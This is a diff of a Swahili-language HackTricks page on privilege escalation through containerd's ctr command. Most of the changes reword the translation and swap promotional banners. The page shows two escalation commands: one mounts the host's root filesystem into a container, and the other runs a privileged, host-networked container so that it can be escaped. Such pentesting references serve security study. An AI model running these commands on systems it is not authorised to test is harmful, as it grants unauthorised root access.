@@ -1,18 +1,19 @@
 # Kupandisha Hadhi ya Mamlaka ya Containerd (ctr)
 
+{% hint style="success" %}
+Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Taarifa Msingi
 
@@ -24,7 +25,7 @@ Nenda kwenye kiungo kifuatacho kujifunza **ni nini containerd** na `ctr`:
 
 ## PE 1
 
-ikiwa unagundua kuwa mwenyeji una amri ya `ctr`:
+ikiwa utagundua kwamba mwenyeji una amri ya `ctr`:
 ```bash
 which ctr
 /usr/bin/ctr
@@ -36,33 +37,34 @@ REF                                  TYPE                                       
 registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
 registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
 ```
-Na kisha **endesha moja ya picha hizo ukiunganisha saraka ya mizizi ya mwenyeji**:
+Na kisha **endesha moja ya picha hizo ukiunganisha folda ya mizizi ya mwenyeji kwake**:
 ```bash
 ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
 ```
 ## PE 2
 
-Chalaza chombo kwa haki za juu na kutoroka kutoka kwake.\
-Unaweza kuchalaza chombo chenye haki za juu kama:
+Endesha kontena kwa haki za juu na kutoroka kutoka humo.\
+Unaweza kuendesha kontena lenye haki za juu kama:
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Kisha unaweza kutumia baadhi ya mbinu zilizotajwa katika ukurasa ufuatao **kutoroka kutoka kwayo kwa kutumia uwezo wa kipekee**:
+Kisha unaweza kutumia baadhi ya mbinu zilizotajwa kwenye ukurasa ufuatao **kutoroka kutoka kwayo kwa kutumia uwezo uliopewa kwa mamlaka**:
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
 {% endcontent-ref %}
 
+{% hint style="success" %}
+Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
